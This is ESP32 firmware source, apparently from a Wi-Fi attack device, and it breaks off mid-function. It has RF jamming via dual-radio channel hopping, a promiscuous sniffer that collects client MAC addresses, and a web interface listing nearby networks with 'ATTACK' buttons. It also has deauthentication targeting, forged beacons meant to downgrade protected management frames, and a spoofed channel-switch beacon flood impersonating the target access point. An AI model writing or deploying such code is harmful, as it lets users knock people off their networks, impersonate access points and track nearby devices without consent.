void aggressiveRandomMode(){
  static unsigned long lh=0;
  if(micros()-lh>130){
    lh=micros();
    static uint8_t f=0,r=125;
    f++;if(f>125)f=0;radio.setChannel(f);
    if(r==0)r=126;r--;radio1.setChannel(r);
  }
}
void stopJamming(){
  radio.powerDown();radio1.powerDown();delay(100);
  esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);
  isWebRfJamming=false;
}

void snifferCallback(void*buf,wifi_promiscuous_pkt_type_t type){
  if(type!=WIFI_PKT_MGMT&&type!=WIFI_PKT_DATA)return;
  uint8_t*p=((wifi_promiscuous_pkt_t*)buf)->payload;
  uint8_t*src=p+10,*dst=p+4,*bssid=p+16;
  uint8_t*cM=nullptr,*aM=nullptr;
  if(memcmp(src,bssid,6)==0){cM=dst;aM=bssid;}
  else if(memcmp(dst,bssid,6)==0){cM=src;aM=bssid;}
  if(cM&&aM){
    if(cM[0]==0xFF&&cM[1]==0xFF)return;
    if(cM[0]==0x33&&cM[1]==0x33)return;
    bool ex=false;
    for(int i=0;i<globalSniffedCount;i++)
      if(memcmp(globalSniffedClients[i].client,cM,6)==0){ex=true;break;}
    if(!ex&&globalSniffedCount<50){
      memcpy(globalSniffedClients[globalSniffedCount].client,cM,6);
      memcpy(globalSniffedClients[globalSniffedCount].bssid,aM,6);
      globalSniffedCount++;
    }
    if(isDeauthing&&memcmp(aM,targetBSSID,6)==0){
      bool e2=false;
      for(int i=0;i<capturedClientCount;i++)
        if(memcmp(capturedClients[i],cM,6)==0){e2=true;break;}
      if(!e2&&capturedClientCount<20){
        memcpy(capturedClients[capturedClientCount],cM,6);
        capturedClientCount++;
      }
    }
  }
}

void startWiFiScan(){
  Serial.println("[*] Scanning...");
  WiFi.mode(WIFI_AP_STA);WiFi.disconnect(true);delay(100);
  globalSniffedCount=0;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  networkCount=WiFi.scanNetworks(false,true);
  esp_wifi_set_promiscuous(false);delay(50);
  WiFi.mode(WIFI_AP);delay(50);
  networkListHTML="";
  if(networkCount>0){
    for(int i=0;i<networkCount&&i<20;i++){
      scannedNetworks[i].ssid=WiFi.SSID(i);
      memcpy(scannedNetworks[i].bssid,WiFi.BSSID(i),6);
      scannedNetworks[i].channel=WiFi.channel(i);
      scannedNetworks[i].rssi=WiFi.RSSI(i);
      scannedNetworks[i].encType=WiFi.encryptionType(i);
      int cC=getClientCountForNetwork(i);
      String s=scannedNetworks[i].ssid;
      if(s.length()==0)s="<i>Hidden</i>";
      s.replace("<","&lt;");s.replace(">","&gt;");
      bool pmf=isPMFRequired(scannedNetworks[i].encType);
      String eS=getEncName(scannedNetworks[i].encType);
      String ec=pmf?"#ff5555":"#0f0";
      networkListHTML+="<tr><td>["+String(i)+"]</td><td style='text-align:left;'>"+s+"<br><span style='color:#666;font-size:11px;'>Ch:"+String(scannedNetworks[i].channel)+" | "+String(scannedNetworks[i].rssi)+"dBm | <span style='color:"+ec+";'>"+eS+"</span></span></td><td><b style='color:#00ffff;'>"+String(cC)+"</b></td><td><a href='/deauth?idx="+String(i)+"' class='btn-attack'>"+(pmf?"CSA-ONLY":"ATTACK")+"</a></td></tr>";
    }
  }else{networkListHTML="<tr><td colspan='4'>No networks!</td></tr>";}
  scanExecuted=true;
  Serial.printf("[*] Done: %d networks\n",networkCount);
}

void startDeauth(int index){
  if(index<0||index>=networkCount)return;
  memcpy(targetBSSID,scannedNetworks[index].bssid,6);
  targetChannel=scannedNetworks[index].channel;
  targetSSID=scannedNetworks[index].ssid;
  targetEncType=scannedNetworks[index].encType;
  targetPMFRequired=isPMFRequired(targetEncType);
  WiFi.mode(WIFI_AP_STA);delay(100);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);delay(50);
  esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_protocol(WIFI_IF_STA,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  seqNum=0;capturedClientCount=0;deauthCycles=0;
  Serial.printf("[*] DEAUTH: %s Ch:%d\n",targetSSID.c_str(),targetChannel);
  isDeauthing=true;
}
void stopDeauth(){
  isDeauthing=false;targetSSID="";
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_AP);delay(100);
  Serial.println("[*] Deauth Stopped");
}

void sendPMFDowngradeBeacon(){
  uint8_t p[128];p[0]=0x80;p[1]=0;p[2]=0;p[3]=0;memset(&p[4],0xFF,6);
  memcpy(&p[10],targetBSSID,6);memcpy(&p[16],targetBSSID,6);
  uint16_t sc=(seqNum&0x0FFF)<<4;p[22]=sc&0xFF;p[23]=(sc>>8)&0xFF;seqNum=(seqNum+1)&0x0FFF;
  uint64_t ts=esp_timer_get_time();memcpy(&p[24],&ts,8);
  p[32]=0x64;p[33]=0;p[34]=0x31;p[35]=0x04;int o=36;p[o++]=0;p[o++]=0;
  p[o++]=0x30;p[o++]=0x14;p[o++]=1;p[o++]=0;
  p[o++]=0;p[o++]=0;p[o++]=0x0F;p[o++]=0xAC;p[o++]=4;p[o++]=1;p[o++]=0;
  p[o++]=0;p[o++]=0;p[o++]=0x0F;p[o++]=0xAC;p[o++]=4;p[o++]=1;p[o++]=0;
  p[o++]=0;p[o++]=0;p[o++]=0x0F;p[o++]=0xAC;p[o++]=2;p[o++]=0;p[o++]=0;
  for(int i=0;i<3;i++){
    esp_wifi_80211_tx(WIFI_IF_AP,p,o,false);
    esp_wifi_80211_tx(WIFI_IF_STA,p,o,false);
    responsiveDelay(20);
  }
}
void sendCSABeaconFlood(){
  uint8_t p[80];p[0]=0x80;p[1]=0;p[2]=0;p[3]=0;memset(&p[4],0xFF,6);
  memcpy(&p[10],targetBSSID,6);memcpy(&p[16],targetBSSID,6);
  int o=24;uint64_t ts=esp_timer_get_time();memcpy(&p[o],&ts,8);o+=8;
  p[o++]=0x64;p[o++]=0;p[o++]=1;p[o++]=0;p[o++]=0;p[o++]=0;p[o++]=1;p[o++]=1;p[o++]=0x82;
  p[o++]=3;p[o++]=1;p[o++]=targetChannel;p[o++]=0x25;p[o++]=3;p[o++]=1;
  int ci=o;p[o++]=14;p[o++]=0;uint8_t ic[]={14,1,14,12,13,1,14,1,12,13};
  for(int i=0;i<10;i++){
    p[ci]=ic[i];p[ci+1]=0;uint64_t t2=esp_timer_get_time();memcpy(&p[24],&t2,8);
    uint16_t s2=(seqNum&0x0FFF)<<4;p[22]=s2&0xFF;p[23]=(s2>>8)&0xFF;seqNum=(seqNum+1)&0x0FFF;
    esp_wifi_80211_tx(WIFI_IF_AP,p,o,false);esp_wifi_80211_tx(WIFI_IF_STA,p,o,false);
